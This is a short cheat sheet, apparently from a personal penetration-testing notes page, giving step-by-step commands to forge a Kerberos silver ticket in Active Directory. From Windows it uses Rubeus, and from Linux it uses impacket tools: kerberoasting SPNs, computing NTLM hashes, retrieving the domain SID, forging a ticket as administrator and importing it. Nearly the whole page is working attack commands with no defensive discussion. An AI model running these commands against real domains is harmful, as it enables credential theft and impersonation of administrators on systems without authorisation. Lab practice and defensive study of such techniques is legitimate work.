---
title: "Silver Ticket"
date: 2024-7-30
tags: ["silver ticket", "rubeus", "active directory", "ad", "domain controller", "Windows", "GetUserSPNs"]
---

---
### From Windows

#### 1. Get service principle name (SPN)

```powershell
.\rubeus.exe kerberoast /domain:example.com /dc:dc.example.com /creduser:example.com\username /credpassword:password /nowrap
```

#### 2. Generate NTLM

```powershell
.\rubeus.exe hash /password:password
```

#### 3. Get domain SID

#### Locally

```powershell
import-module activedirectory
```

```powershell
Get-ADDomain | fl DomainSID
```

#### Remotely

```powershell
# Install ldp.exe (Windows 11)
Settings > System > Optional Features > More Windows Features and add 'Active Driectory Lightweight Directory Services'
```

```powershell 
# Bind > Bind with credentials
ldp.exe
```

```powershell
# Browse > Search
BaseDN: DC=example,DC=com
Filter: (objectclass=User)
```

#### 4. Generate Silver Ticket

```powershell
.\rubeus.exe silver /domain:example.com /dc:dc.example.com /sid:<SID> /rc4:<NTLM> /user:administrator /service:<SPN> /ptt
```

#### 5. Check

```powershell
klist
```

### From Linux

#### 1. Get service principle name (SPN)

```bash
sudo ntpdate -s 10.10.11.10 && impacket-GetUserSPNs example.com/username:password -dc-ip dc.example.com -request -k
```

```bash
# If NTLM auth is disabled
sudo ntpdate -s 10.10.11.10 && impacket-GetUserSPNs example.com/username:password -dc-host dc.example.com -request -k
```

#### 2. Generate NTLM

```bash
iconv -f ASCII -t UTF-16LE <(printf "password") | openssl dgst -md4
```

#### 3. Get domain SID

```bash
sudo ntpdate -s 10.10.11.10 && impacket-getPac -targetUser administrator example.com/username:password
```

#### 4. Generate Silver Ticket

```bash
impacket-ticketer -nthash <NTLM> -domain-sid <SID> -domain example.com -dc-ip dc.example.com -spn <SPN> administrator
```

#### 5. Import ticket

```bash
export KRB5CCNAME=administrator.ccache
```

#### 6. Check

```bash
klist
```

<br>